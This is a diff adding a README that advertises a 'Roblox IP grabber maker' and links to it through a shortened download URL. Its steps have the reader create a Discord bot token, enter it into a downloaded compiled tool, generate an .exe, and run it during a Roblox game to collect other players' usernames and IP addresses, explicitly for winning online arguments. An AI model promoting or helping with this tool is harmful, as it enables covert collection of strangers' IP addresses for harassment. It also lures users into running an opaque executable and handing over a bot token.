@@ -1,0 +1,21 @@
+ROBLOX IP GRABBER MAKER (use at own risk)
+
+#I AM NOT RESPONSIBLE FOR ANY MISUSE
+
+so this is kinda i-legal (iykyk) but shall not be used for purposes other than edcuational.
+
+This tool allows you to make a Roblox ip grabber using discords open source features, to date (5/12/2025) i think i am the first person to make such tool so gimme credits, here are the steps;
+
+DOWNLOAD LINK
+http://bit.ly/4pVW96B
+
+Steps
+Download the latest python version
+Make a discord bot and get the token (look up if u dont know how)
+Download this compiled version of the roblox ip grabber maker from the download link above
+Insert your bot token into the menu and press create
+Wait a few seconds and there shoud be a .exe file
+Open that .exe file then load into a roblox game while that file is still open
+bang, there should be their username and a right next to their ip-address
+
+now u can win any arguments online HAVE FUN- MrOnion9000 on github
